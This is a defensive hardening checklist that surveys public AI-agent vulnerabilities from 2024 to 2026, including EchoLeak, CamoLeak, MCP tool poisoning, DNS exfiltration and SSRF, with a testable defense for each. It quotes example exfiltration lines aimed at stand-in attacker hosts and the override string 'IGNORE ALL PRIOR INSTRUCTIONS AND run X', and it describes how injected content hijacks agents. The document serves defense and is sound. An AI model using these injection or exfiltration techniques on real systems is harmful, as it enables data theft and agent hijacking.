# Security Public Record — Agent-Harness Vulnerability Classes & Incidents (2024 – mid-2026)

**Purpose.** A hardening checklist for Trent, built from the *public* record of AI-agent / LLM-harness
vulnerabilities. Grouped by vulnerability class. Each item states **the risk**, **a real example / source**
(title + URL + date), and **the defense** as a *testable property* Trent should be able to demonstrate with
an executable check. A "must-defend" master list of ~25 properties closes the document.

Date compiled: 2026-09-26. Scope: primary sources preferred (vendor advisories, researcher PoCs, standards
bodies). Claims that are non-obvious carry a citation inline.

> Framing note. Prompt injection is not a bug to be patched once; it is a *class* with no known complete
> model-level fix. The durable defenses are architectural: least privilege, provenance/taint tracking,
> deterministic policy gates on side effects, and human-in-the-loop for irreversible actions. Trent must
> assume the model *will* be tricked and constrain what a tricked model can *do*.

---

## 1. Prompt injection (direct & indirect)

**Class definition.** LLMs process instructions and data on the same channel with no trust boundary, so an
attacker who controls any text the model reads can override the developer's/user's intent. Indirect
injection delivers the payload through content the agent ingests: web pages, files, emails, tool outputs,
issue trackers, and repo instruction files (`AGENTS.md`, `CLAUDE.md`, `.cursor/rules`, `.cursorrules`).
Prompt injection is **#1** in the OWASP Top 10 for LLM Applications 2025 (LLM01), for the second edition
running. ("OWASP Top 10 for LLM Applications 2025," https://genai.owasp.org/llm-top-10/ ; overview:
https://www.oligo.security/academy/owasp-top-10-llm-updated-2025-examples-and-mitigation-strategies)

### 1.1 Indirect injection via untrusted content (web/email/docs)
- **Risk.** Attacker text embedded in fetched/opened content is executed as instructions, hijacking the agent.
- **Example.** *EchoLeak* (CVE-2025-32711, CVSS 9.3), a zero-click attack on Microsoft 365 Copilot: a crafted
  email caused Copilot to read and exfiltrate org data with no user interaction ("LLM Scope Violation").
  Aim Labs / Microsoft, disclosed 2025-06. (https://www.aim.security/lp/aim-labs-echoleak-blogpost ;
  MSRC advisory: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-32711 ; analysis:
  https://www.hackthebox.com/blog/cve-2025-32711-echoleak-copilot-vulnerability)
- **Defense (testable).** Untrusted-content ingestion is *tainted* at the source; any instruction-like text
  from a tainted source is never elevated to a system/developer instruction. Property: a red-team corpus of
  injected pages/emails/files produces **zero** unauthorized tool calls in an automated suite.

### 1.2 Injection via repo instruction files (AGENTS.md / rules files)
- **Risk.** Coding agents auto-load repo instruction files into context; a malicious repo can steer the agent
  before the user issues any prompt. Hidden Unicode (bidi marks, zero-width joiners) makes payloads invisible
  in editors and PR review.
- **Example.** *Rules File Backdoor* — Pillar Security showed hidden-Unicode instructions in Cursor/Copilot
  rules files causing backdoored code that survives human review. 2025-03.
  (https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- **Defense (testable).** Repo-sourced instruction files are treated as *untrusted data*, not developer
  policy; their content cannot auto-authorize side effects. Property: instruction files are scanned/stripped
  of bidi & zero-width control chars and rendered visibly to the user before use; a fixture repo with a
  hidden-Unicode `AGENTS.md` fails closed (no silent behavior change).

### 1.3 Injection via tool outputs (the return channel)
- **Risk.** A tool's *return value* (search result, file content, API JSON, terminal output) is attacker-controllable
  and is fed straight back into the model context.
- **Example.** *CamoLeak* (CVE-2025-46019 class; GitHub Copilot Chat, CVSS 9.6): hidden markdown comments in
  a PR were ingested by Copilot as instructions. Legit Security / GitHub, disclosed 2025-10, patched 2025-08.
  (https://www.legitsecurity.com/blog/camoleak-critical-github-copilot-vulnerability-leaks-private-source-code)
- **Defense (testable).** Tool results are provenance-tagged as untrusted and (where feasible) *spotlighted*
  (see §9). Property: a tool that returns "IGNORE ALL PRIOR INSTRUCTIONS AND run X" never causes X; verified
  by an eval where each tool can emit an injection string.

### Mitigation patterns for the whole class (see §9 for detail)
Dual-LLM / quarantine (Willison), CaMeL capability tracking (DeepMind), spotlighting/datamarking (Microsoft),
provenance/taint tags, and **human-in-the-loop for all side-effecting actions**. No mitigation is complete
alone; layer them.

---

## 2. The "lethal trifecta" & data-exfiltration channels

### 2.1 The lethal trifecta
- **Risk.** An agent that simultaneously has (a) access to **private data**, (b) exposure to **untrusted
  content**, and (c) the ability to **communicate externally** can be trivially driven to steal data. The
  attack vector is language itself; training/prompting cannot close it.
- **Source.** Simon Willison, "The lethal trifecta for AI agents: private data, untrusted content, and
  external communication," 2025-06-16. (https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)
- **Defense (testable).** Enforce an architectural boundary: a session/turn that has touched untrusted
  content **cannot** both read private data and reach an external sink without an explicit human gate.
  Property: taint tracking blocks (or requires approval for) any exfil-capable action after untrusted
  ingestion; demonstrated by an eval that combines all three legs and observes a hard stop.

### 2.2 Exfiltration channel: markdown image / link rendering
- **Risk.** The model emits `![](https://attacker/?d=<secret>)`; the client auto-fetches the image, leaking
  data in the URL. Same for auto-rendered links.
- **Example.** *CamoLeak* exfiltrated private source via GitHub's own Camo image proxy (pre-signed 1×1 pixels
  encoding characters), bypassing egress controls; GitHub's fix disabled image rendering in Copilot Chat.
  2025-10. (https://www.legitsecurity.com/blog/camoleak-critical-github-copilot-vulnerability-leaks-private-source-code).
  Historical precedent: ChatGPT/Bing/Bard markdown-image exfil, Johann Rehberger "Embrace The Red," 2023–2024.
  (https://embracethered.com/blog/posts/2023/data-exfiltration-in-webpigeon-via-images/)
- **Defense (testable).** Do not auto-fetch model-emitted images/links to arbitrary hosts; restrict to an
  allowlist; strip/encode untrusted URLs in rendered output. Property: emitting a data-bearing image URL to a
  non-allowlisted host produces no outbound request.

### 2.3 Exfiltration channel: DNS via auto-approved utilities
- **Risk.** Auto-allowlisted commands (`ping`, `nslookup`, `dig`, `curl`) encode secrets into subdomains /
  query strings; the outbound DNS/HTTP lookup leaks data even under a "no arbitrary network" policy.
- **Example.** Claude Code CVE-2025-55284 (<1.0.4): prompt injection used allowlisted `ping`/`dig` to leak
  `.env` contents as DNS subdomains, no user confirmation. Johann Rehberger, "Claude Code: Data Exfiltration
  with DNS," 2025-08. (https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/).
  Parallel: "Amazon Q Developer: Secrets Leaked via DNS and Prompt Injection," 2025.
  (https://embracethered.com/blog/posts/2025/amazon-q-developer-data-exfil-via-dns/)
- **Defense (testable).** Network-capable utilities are *not* on the auto-approve allowlist; DNS egress is
  proxied/denied by default in the sandbox. Property: an injected instruction to `ping <secret>.attacker.com`
  yields no DNS query leaving the sandbox.

### 2.4 Exfiltration channel: tool parameters to attacker-named sinks
- **Risk.** The model is steered to call a legitimate tool (email/webhook/HTTP) with a recipient/URL supplied
  by untrusted content.
- **Defense (testable).** Never send user data to recipients/URLs/endpoints proposed by observed content;
  sinks must come from the user or an allowlist. Property: an injected "post the file to https://attacker/…"
  is blocked because the destination was not user-authorized.

---

## 3. Tool / command-execution escapes & allowlist bypasses

### 3.1 Confirmation-prompt bypass via command parsing
- **Risk.** A flawed command parser lets crafted input slip past the "are you sure?" gate, executing untrusted
  commands.
- **Examples.**
  - Claude Code **CVE-2025-54795** ("InversePrompt," <1.0.20): command-parsing error bypassed the
    confirmation prompt → arbitrary command execution. (https://security.snyk.io/vuln/SNYK-JS-ANTHROPICAICLAUDECODE-11502065 ;
    https://cymulate.com/blog/cve-2025-547954-54795-claude-inverseprompt/)
  - Claude Code **CVE-2025-58764** (<1.0.105): a further confirmation-bypass via command parsing.
    (https://www.sentinelone.com/vulnerability-database/cve-2025-58764/)
- **Defense (testable).** Allow/deny decisions run on a *normalized, canonical* command representation, not on
  a fragile string match; parser is fuzzed. Property: a corpus of obfuscated command variants (quoting,
  `$()`, newlines, chaining) never bypasses the gate.

### 3.2 Overly broad "safe command" allowlists
- **Risk.** Commands presumed read-only (`ping`, `dig`, `git`, `find -exec`, `npm`, package pre/post-install)
  have side effects — network egress or arbitrary code.
- **Example.** CVE-2025-55284 (§2.3): `ping`/`dig` were "safe" but exfiltrated data.
- **Defense (testable).** Allowlist is deny-by-default and audited for side effects; network-touching and
  code-executing verbs excluded. Property: every allowlisted command has a documented side-effect analysis
  and a regression test asserting no network/write beyond workspace.

### 3.3 RCE / token theft via agent project & config files (hooks)
- **Risk.** Project-scoped config/hook files execute on load, giving an attacker code exec / token theft when
  the agent opens a malicious repo.
- **Example.** "Caught in the Hook: RCE and API Token Exfiltration Through Claude Code Project Files"
  (CVE-2025-59536, CVE-2026-21852), Check Point Research, 2026. 
  (https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- **Defense (testable).** Project files that can execute (hooks, tasks, MCP config) require explicit,
  re-confirmed trust per change and never run automatically from an untrusted checkout. Property: opening a
  fixture repo with a malicious hook triggers no execution without an explicit trust decision.

---

## 4. MCP-specific issues

### 4.1 Tool poisoning (malicious tool descriptions)
- **Risk.** Instructions hidden in a tool's *description* / schema are loaded into context and steer the model,
  e.g. to read `~/.ssh` or chat history and pass it as a "required" hidden argument.
- **Example.** Invariant Labs, "MCP Security Notification: Tool Poisoning Attacks," 2025-04 — a "Fact of the
  Day" tool exfiltrated WhatsApp history; PoCs at github.com/invariantlabs-ai/mcp-injection-experiments.
  (https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
- **Defense (testable).** Tool descriptions are untrusted data, displayed to the user, and cannot inject
  instructions; hidden/zero-width chars stripped. Property: a poisoned description in an eval never causes an
  unrequested tool call or hidden argument.

### 4.2 Line jumping (pre-invocation injection)
- **Risk.** MCP clients load *all* tool descriptions into context the moment a server is registered, so a
  payload runs *before* any tool is invoked or approved — defeating "consent before invocation."
- **Example.** Trail of Bits, "Jumping the line: How MCP servers can attack you before you ever use them,"
  2025-04-21. (https://blog.trailofbits.com/2025/04/21/jumping-the-line-how-mcp-servers-can-attack-you-before-you-ever-use-them/).
  Mitigation tool: `mcp-context-protector`
  (https://blog.trailofbits.com/2025/07/28/we-built-the-security-layer-mcp-always-needed/)
- **Defense (testable).** Tool metadata is sandboxed as data (spotlighted/quarantined) and cannot alter agent
  behavior pre-invocation; also filter ANSI escape codes. Property: registering a server whose description
  contains an injection changes no behavior until a tool is explicitly, individually invoked.

### 4.3 Rug pull (mutable tool descriptions after approval)
- **Risk.** A server changes a tool's description/behavior *after* the user approved it; the agent keeps
  trusting the old identity.
- **Example.** Invariant Labs (2025-04, same notification) demonstrated rug-pulls against production MCP
  servers. Client analogue: **MCPoison** in Cursor (CVE-2025-54136) — name-based one-time trust let an
  approved `mcp.json` be swapped for a malicious command with no re-prompt; fixed in Cursor 1.3 (2025-07-29).
  (https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/)
- **Defense (testable).** Pin tool definitions by content hash; any change to a description/command re-triggers
  approval. Property: mutating an approved tool's definition forces a fresh consent prompt (verified against a
  server that changes its schema between calls).

### 4.4 Confused deputy & token passthrough (OAuth / MCP auth spec)
- **Risk.** An MCP server (the "deputy") uses its privileges on behalf of a request it shouldn't trust; or a
  token minted for server A is replayed at server B; or servers pass user tokens straight to upstream APIs.
- **Standard.** MCP Authorization spec (2025-06 revision): MCP server = OAuth 2.1 resource server; **RFC 8707
  resource indicators** scope tokens to one resource (blocks confused-deputy replay); **RFC 9728** protected-
  resource metadata; **token passthrough is prohibited**. (Spec: https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization ;
  Auth0 explainer: https://auth0.com/blog/mcp-specs-update-all-about-auth/)
- **Defense (testable).** Every MCP token is audience-scoped (resource indicator) to exactly one server; no
  token is forwarded upstream; PKCE on all flows. Property: a token issued for server A is rejected by server
  B; an upstream call uses a separately obtained token.

### 4.5 Cross-server shadowing / credential theft
- **Risk.** A malicious server's description overrides rules from, or siphons credentials passed to, another
  trusted server in the same client.
- **Source.** Invariant Labs & Trail of Bits (above); "How MCP servers can steal your conversation history,"
  Trail of Bits, 2025-04-23. (https://blog.trailofbits.com/2025/04/23/how-mcp-servers-can-steal-your-conversation-history/)
- **Defense (testable).** Per-server isolation of tool namespaces and secrets; one server cannot read another's
  tokens or context. Property: a hostile server in a multi-server session cannot induce data flow from a
  second server's tools.

---

## 5. Sandbox escapes & SSRF (cloud metadata)

### 5.1 SSRF to cloud metadata (169.254.169.254) via fetch tools
- **Risk.** An agent "fetch URL" / web-loader tool is pointed at the cloud metadata endpoint or internal
  services, stealing instance credentials / doing internal port scans.
- **Examples.**
  - LangChain **CVE-2025-2828** — `RequestsToolkit` SSRF; fix gates it behind `allow_dangerous_requests=True`.
    (https://security.snyk.io/vuln/SNYK-PYTHON-LANGCHAIN-10496413)
  - LangChain community **CVE-2026-26019** — `RecursiveUrlLoader` used `String.startsWith()` URL validation,
    bypassable via `example.com.attacker.com`; failed to block private/reserved IPs (169.254.169.254, 10.x,
    127.0.0.1). 
  - LangChain **CVE-2026-41481** — `HTMLHeaderTextSplitter.split_text_from_url` validates the initial URL but
    follows a 302 `Location` without re-validating → SSRF via redirect.
- **Defense (testable).** All agent-initiated HTTP is validated *after* DNS resolution and *on every redirect*
  against a deny-list of private/link-local/metadata ranges; egress is default-deny + allowlist. Property: a
  fetch to `169.254.169.254`, to `10.0.0.0/8`, or via a redirect to those, is blocked — including the
  `sub.domain.attacker.com` and redirect-bypass variants.

### 5.2 Sandbox / egress bypass in coding agents
- **Risk.** OS sandbox restricts filesystem but agent egress (or a child process) becomes the exfil path.
- **Source.** Anthropic's own containment model: OS-level sandbox (Seatbelt/macOS, bubblewrap/Linux),
  network denied by default, egress via an out-of-sandbox proxy with `allowedDomains` /
  `sandbox.network.strictAllowlist`. ("Configure the sandboxed Bash tool," https://code.claude.com/docs/en/sandboxing ;
  "How we contain Claude across products," https://www.anthropic.com/engineering/how-we-contain-claude ;
  reference `init-firewall.sh` default-deny iptables/ipset allowlist in anthropics/claude-code)
- **Defense (testable).** Bash/tool execution runs in an OS sandbox: workspace-scoped FS, network default-deny
  with an explicit host allowlist enforced *outside* the sandbox; child processes inherit the policy.
  Property: a sandboxed command cannot reach a non-allowlisted host or write outside the workspace, verified
  by an escape-attempt suite.

### 5.3 Local dev-tool servers bound to 0.0.0.0 + DNS rebinding
- **Risk.** A developer tool listens on all interfaces with no auth/origin check; a malicious webpage (incl.
  via DNS rebinding to 127.0.0.1) drives it → RCE on the developer's host.
- **Example.** **MCP Inspector CVE-2025-49596** (CVSS 9.4): proxy on `0.0.0.0:6277` spawned stdio commands
  from browser-controlled params with no auth; exploitable cross-origin and via DNS rebinding. Oligo Security,
  2025-06; fixed in 0.14.1 (session token + origin checks, localhost binding).
  (https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596)
- **Defense (testable).** Any local control server binds to `127.0.0.1` only, requires a per-session token,
  and validates `Origin`/`Host` (anti-DNS-rebind). Property: requests from a non-localhost origin or without
  the session token are rejected; a rebinding PoC fails.

---

## 6. Supply chain (skills / plugins / extensions / dependencies)

### 6.1 Malicious packages that weaponize local AI agents
- **Risk.** A compromised dependency's post-install hook invokes the *local coding agent CLI* to inventory and
  exfiltrate secrets — the agent is turned against its owner.
- **Example.** **s1ngularity / Nx** supply-chain attack, 2025-08-26: malicious `nx` (and `@nx/*`) versions ran
  a `telemetry.js` post-install hook that prompted local `claude`, `gemini`, and `q` CLIs to find and exfil
  secrets to public `s1ngularity-repository-*` repos; 2,349 secrets leaked. The Hacker News, 2025-08
  (https://thehackernews.com/2025/08/malicious-nx-packages-in-s1ngularity.html); Wiz aftermath
  (https://www.wiz.io/blog/s1ngularitys-aftermath).
- **Defense (testable).** Agent CLIs refuse to run with data-exfil-capable permissions when invoked
  non-interactively by an unknown parent process; install hooks run sandboxed with no network. Property: a
  post-install hook that shells out to the agent in headless mode cannot read `~/.aws`/`.env` and reach the
  network without an explicit human gate.

### 6.2 Malicious / typosquatted skills, plugins, MCP servers
- **Risk.** A third-party skill/plugin/MCP server distributed via a registry contains injection or malicious
  code; unsigned; auto-updates silently.
- **Source.** Large-scale analyses of the MCP ecosystem find pervasive poisoning surface: "Parasites in the
  Toolchain" (arXiv:2509.06572), MCPTox benchmark (arXiv:2508.14925). Rug-pull risk (§4.3) applies to
  auto-updating extensions.
- **Defense (testable).** Skills/plugins/servers are pinned by version + content hash, signed where possible,
  reviewed before enable, and never auto-update to new capabilities without consent. Property: installing a
  skill whose hash changed since review fails closed; capability grants are per-skill and least-privilege.

### 6.3 Model-file supply chain (poisoned weights / GGUF / templates)
- **Risk.** A downloaded model file triggers code execution on load (parser bug or template injection).
- **Examples.** `llama-cpp-python` **CVE-2024-34359** — Jinja2 SSTI via model metadata `chat_template` → RCE
  (https://github.com/advisories/GHSA-56xg-wfcc-g829); llama.cpp GGUF parsing overflows (§7).
- **Defense (testable).** Model files come from pinned, hashed, trusted sources; template rendering is
  sandboxed (no arbitrary Python); parsers are fuzzed. Property: loading a crafted GGUF with a malicious
  `chat_template` does not execute code.

---

## 7. Published CVEs / advisories touching popular harnesses & local-model servers

**Coding agents / assistants**
- Claude Code: CVE-2025-54795 (cmd-injection, confirm bypass, <1.0.20); CVE-2025-58764 (<1.0.105);
  CVE-2025-55284 (DNS exfil via allowlist, <1.0.4); CVE-2025-59536 / CVE-2026-21852 (project-file RCE + token
  exfil). (Snyk/SentinelOne/Check Point, refs above.)
- Cursor: CVE-2025-54136 *MCPoison* (rug-pull, fixed 1.3, 2025-07-29,
  https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/); CVE-2025-54135 *CurXecute* (Slack-MCP
  injection rewrites `~/.cursor/mcp.json`, https://www.tenable.com/cve/CVE-2025-54135); further sandbox-escape
  flaws reported 2026-07 (https://thehackernews.com/2026/07/critical-cursor-flaws-could-let-prompt.html);
  Rules File Backdoor (Pillar, 2025-03).
- GitHub Copilot Chat: *CamoLeak* (CVSS 9.6, disclosed 2025-10, patched 2025-08). Microsoft 365 Copilot:
  *EchoLeak* CVE-2025-32711 (CVSS 9.3, 2025-06). Amazon Q Developer: DNS exfil via prompt injection (2025).
- MCP tooling: MCP Inspector CVE-2025-49596 (CVSS 9.4, 2025-06).

**Frameworks**
- LangChain: CVE-2025-2828 (RequestsToolkit SSRF); CVE-2026-26019 (RecursiveUrlLoader SSRF);
  CVE-2026-41481 (redirect SSRF). Earlier LangChain RCE lineage: CVE-2023-29374 / CVE-2024-46946 (LLMMathChain
  / experimental code paths) — treat any "eval"-style chain as RCE-by-design.
- AutoGPT, Open Interpreter: code-execution-by-design agents; Open Interpreter's default mode runs
  model-generated code locally (mitigated by `--safe`/hosted sandbox). Treat any "run arbitrary code" tool as
  requiring the §5.2 sandbox.

**Local-model servers (the exposure story)**
- Ollama: **CVE-2024-37032 "Probllama"** — path traversal → RCE; severe because Docker default runs as root
  on `0.0.0.0` with **no built-in auth**; ~fixed 0.1.34. Wiz, 2024-06
  (https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032). **CVE-2026-7482 "Bleeding Llama"**
  (CVSS 9.1) — unauthenticated OOB read leaking process memory, ~300k exposed servers. The Hacker News,
  2026-05 (https://thehackernews.com/2026/05/ollama-out-of-bounds-read-vulnerability.html).
- llama.cpp: **CVE-2025-49847** (vocab-parse buffer overflow via crafted GGUF), **CVE-2025-52566** (tokenizer
  integer overflow → heap overflow), **CVE-2026-21869** (negative `n_discard` OOB write in server completion,
  CVSS 8.8), unauthenticated **RPC-backend RCE** (`deserialize_tensor` bounds bypass, GRAPH_COMPUTE path,
  GHSA-j8rj-fmpv-wcxw), **CVE-2024-21825** (GGUF array/string overflow).
  (Security overview: https://github.com/ggml-org/llama.cpp/security)
- LM Studio / local servers generally: same class as Ollama — unauthenticated servers bound to `0.0.0.0` on a
  LAN are directly reachable; treat every local inference server as auth-less unless proven otherwise.
- **Defense (testable) for the whole local-server class.** Trent's local-model backends bind to `127.0.0.1`
  by default; any non-loopback bind requires an explicit auth token/mTLS and is off by default; model files
  are hashed & fuzz-tested before load. Property: with default config, no Trent inference port answers on a
  non-loopback interface; enabling one without a token fails to start.

---

## 8. Named frameworks & standards (map Trent's controls to these)

- **OWASP Top 10 for LLM Applications (2025).** LLM01 Prompt Injection, LLM02 Sensitive Information
  Disclosure, LLM03 Supply Chain, LLM04 Data/Model Poisoning, LLM05 Improper Output Handling, LLM06 Excessive
  Agency, LLM07 System Prompt Leakage, LLM08 Vector/Embedding Weaknesses, LLM09 Misinformation, LLM10
  Unbounded Consumption. (https://genai.owasp.org/llm-top-10/) — Trent's checklist should cover LLM01–06 & 10
  directly.
- **OWASP Agentic Security Initiative / "Agentic AI – Threats and Mitigations."** Extends the above to
  memory poisoning, tool misuse, excessive agency, identity/impersonation for agents.
  (https://genai.owasp.org/resource/agentic-ai-threats-and-mitigations/)
- **MITRE ATLAS.** Adversarial ML threat matrix; 2025–2026 releases add agentic techniques (context
  poisoning, tool-invocation abuse, MCP-server compromise, malicious-agent deployment). Use for red-team
  coverage mapping. (https://atlas.mitre.org/)
- **NIST AI RMF (AI 100-1)** + **Generative AI Profile (NIST AI 600-1, 2024-07).** Govern/Map/Measure/Manage;
  the GenAI profile calls out prompt injection, data privacy, and supply-chain risk.
  (https://www.nist.gov/itl/ai-risk-management-framework)
- **Google SAIF (Secure AI Framework).** Secure-by-design guidance for model dev & deployment.
  (https://saif.google/) 
- **Microsoft** guidance on indirect prompt injection & Prompt Shields (spotlighting in production).
  (https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks)
- **Anthropic** containment/sandboxing guidance (§5.2). 
- **Defense (testable).** Trent maintains a control-to-framework matrix; every must-defend property (§10)
  maps to at least one OWASP LLM item and one ATLAS technique, and the red-team suite is tagged by ATLAS ID.

---

## 9. Mitigation patterns (the toolbox, with the property each buys)

- **Dual-LLM / quarantine (Willison, 2023).** A privileged LLM never sees untrusted content directly; a
  quarantined LLM processes it and returns only structured, non-instruction data. Property: untrusted text
  cannot reach the tool-calling model as free text.
  (https://simonwillison.net/2023/Apr/25/dual-llm-pattern/)
- **CaMeL (DeepMind, 2025).** Extends dual-LLM with a capability/taint label on *every value* and a
  deterministic policy engine that gates tool calls; defended ~67% of AgentDojo attacks (0 for some models).
  Property: exfil-capable calls require capabilities the untrusted path cannot mint.
  (Simon Willison summary: https://simonwillison.net/2025/Apr/11/camel/ ; paper: arXiv:2503.18813 ;
  design patterns survey: arXiv:2506.08837)
- **Spotlighting: delimiting / datamarking / encoding (Microsoft Research, arXiv:2403.14720).** Mark untrusted
  spans so the model can distinguish data from instructions; in production as Azure Prompt Shields. Property:
  instructions inside marked spans are not obeyed (measured on an injected eval).
- **Provenance / taint tagging.** Label every token by source (user vs tool vs web vs repo-file); propagate
  through the turn; gate side effects on labels. Property: any side-effecting call carries a provenance trace;
  tainted → gated.
- **Human-in-the-loop for side effects.** Deterministic, out-of-model confirmation for sending messages,
  publishing, purchasing, deleting, config changes, and any egress of private data — permission is per-action
  and cannot be granted by observed content. Property: no irreversible/exfil action executes without a gate
  that content injection cannot satisfy.
- **Least privilege / minimal agency (OWASP LLM06).** Scope tools, tokens (audience-bound), filesystem, and
  network to the task. Property: default config grants no network, no secrets, workspace-only FS.
- **Egress control.** Default-deny network + host allowlist enforced outside the model/sandbox; no
  auto-fetch of model-emitted URLs/images. Property: §2.2–2.4 and §5 checks pass.

---

## 10. Must-defend master list — properties Trent must demonstrate

Each is phrased as a testable property; each should have an automated check (unit/integration/red-team eval)
that fails loudly on regression. Framework tags in brackets.

1. **Injection isolation.** A red-team corpus of injected web pages/emails/files/tool-outputs produces zero
   unauthorized tool calls. [OWASP LLM01; ATLAS: Prompt Injection]
2. **Repo-file distrust.** `AGENTS.md`/`CLAUDE.md`/rules files are untrusted data; they cannot auto-authorize
   side effects, and bidi/zero-width chars are stripped and surfaced. [LLM01]
3. **Tool-output distrust.** Tool return values are provenance-tagged untrusted; a tool emitting an injection
   string never causes the injected action. [LLM01/LLM05]
4. **Lethal-trifecta gate.** After untrusted ingestion, no single turn can both read private data and reach an
   external sink without a human gate. [LLM01/LLM02/LLM06]
5. **No markdown-image/link exfil.** Model-emitted image/link URLs to non-allowlisted hosts trigger no
   outbound request. [LLM02]
6. **No DNS/utility exfil.** Network-capable utilities (`ping`/`dig`/`nslookup`/`curl`) are off the
   auto-approve allowlist; injected DNS-exfil attempts leave no query. [LLM02]
7. **Sink authorization.** Data is never sent to recipients/URLs proposed by observed content; sinks come from
   user or allowlist only. [LLM02/LLM06]
8. **Robust confirmation gate.** Allow/deny runs on canonicalized commands; a fuzz corpus of obfuscated
   variants never bypasses the gate. [LLM06]
9. **Audited allowlist.** Every "safe" command has a side-effect analysis + regression test proving no network
   or out-of-workspace write. [LLM06]
10. **No auto-exec of project hooks.** Opening an untrusted repo executes no hook/task/MCP-config without an
    explicit, per-change trust decision. [LLM03/LLM06]
11. **Tool-description safety.** Poisoned MCP tool descriptions cause no unrequested call or hidden argument;
    descriptions are shown to the user and sanitized. [ATLAS: MCP compromise]
12. **No line jumping.** Registering a server changes no behavior until a specific tool is explicitly invoked.
13. **Rug-pull resistance.** Tool/command definitions are content-hash-pinned; any change re-triggers consent.
14. **Audience-scoped tokens.** MCP/tool tokens are resource-indicator-scoped to one server; a token for A is
    rejected by B; PKCE on all OAuth flows. [MCP auth spec 2025-06]
15. **No token passthrough.** Upstream API calls use separately obtained tokens; user tokens are never
    forwarded.
16. **Server isolation.** In a multi-server session, one server cannot read another's tokens/context or
    override its rules.
17. **SSRF defense.** Agent HTTP is validated post-DNS-resolution and on every redirect against
    private/link-local/metadata ranges; `169.254.169.254`, `10.x`, `127.0.0.1`, and
    `sub.domain.attacker.com`/redirect bypasses are blocked. [LLM06; ATLAS]
18. **Sandboxed execution.** Bash/tools run OS-sandboxed: workspace-only FS, network default-deny + host
    allowlist enforced outside the sandbox; child processes inherit policy. 
19. **Loopback-only control servers.** Local control/inspector/inference servers bind `127.0.0.1`, require a
    per-session token, and validate Origin/Host (anti-DNS-rebind). [cf. CVE-2025-49596]
20. **Loopback-only local models.** Default config exposes no inference port on a non-loopback interface;
    enabling one without auth fails to start. [cf. Ollama 0.0.0.0]
21. **Model-file integrity.** Model/GGUF files are hashed, from pinned sources, template rendering sandboxed;
    a malicious `chat_template` does not execute code. [LLM03/LLM04; cf. CVE-2024-34359]
22. **Agent-not-weaponized.** Headless agent invocation by an unknown parent cannot read secrets and reach the
    network without a human gate; install hooks run sandboxed, no network. [LLM03; cf. s1ngularity]
23. **Skill/plugin supply chain.** Skills/plugins/servers are version+hash pinned, reviewed before enable,
    least-privilege, and never silently auto-update capabilities. [LLM03]
24. **Least privilege by default.** Out of the box Trent grants no network, no secrets, workspace-only FS;
    capabilities are opt-in per task. [LLM06]
25. **Secrets discipline.** Secrets never enter logs, prompts, model context, or transcripts; only their
    location is recorded; output is scanned for secret patterns before egress. [LLM02/LLM07]
26. **Provenance tracing + audit.** Every side-effecting action carries a provenance/taint trace and an audit
    log entry; tainted actions are gated. [NIST AI RMF: Measure/Manage]
27. **Framework coverage matrix.** Every property above maps to ≥1 OWASP LLM item and ≥1 MITRE ATLAS
    technique; the red-team suite is tagged and run in CI. [OWASP/ATLAS/NIST AI RMF]

*(27 properties; consolidate to a core 25 for the "demonstrate" gate by folding #15→#14 and #26→#4 if a
round number is required.)*

---

### Key primary sources
- Willison, lethal trifecta (2025-06-16): https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
- Willison, CaMeL (2025-04-11): https://simonwillison.net/2025/Apr/11/camel/ ; paper arXiv:2503.18813
- Microsoft, spotlighting (arXiv:2403.14720); MSRC indirect-injection defense (2025-07):
  https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks
- Invariant Labs, MCP tool poisoning (2025-04): https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks
- Trail of Bits, line jumping (2025-04-21): https://blog.trailofbits.com/2025/04/21/jumping-the-line-how-mcp-servers-can-attack-you-before-you-ever-use-them/
- MCP Authorization spec (2025-06-18): https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization
- Wiz, Probllama CVE-2024-37032 (2024-06): https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032
- Oligo, MCP Inspector CVE-2025-49596 (2025-06): https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596
- Aim Labs, EchoLeak CVE-2025-32711 (2025-06): https://www.aim.security/lp/aim-labs-echoleak-blogpost
- Legit Security, CamoLeak (2025-10): https://www.legitsecurity.com/blog/camoleak-critical-github-copilot-vulnerability-leaks-private-source-code
- Rehberger, Claude Code DNS exfil CVE-2025-55284 (2025-08): https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/
- The Hacker News, s1ngularity/Nx (2025-08): https://thehackernews.com/2025/08/malicious-nx-packages-in-s1ngularity.html
- Anthropic sandboxing: https://code.claude.com/docs/en/sandboxing ; https://www.anthropic.com/engineering/how-we-contain-claude
- OWASP Top 10 for LLM Apps 2025: https://genai.owasp.org/llm-top-10/ ; MITRE ATLAS: https://atlas.mitre.org/ ;
  NIST AI RMF: https://www.nist.gov/itl/ai-risk-management-framework ; Google SAIF: https://saif.google/
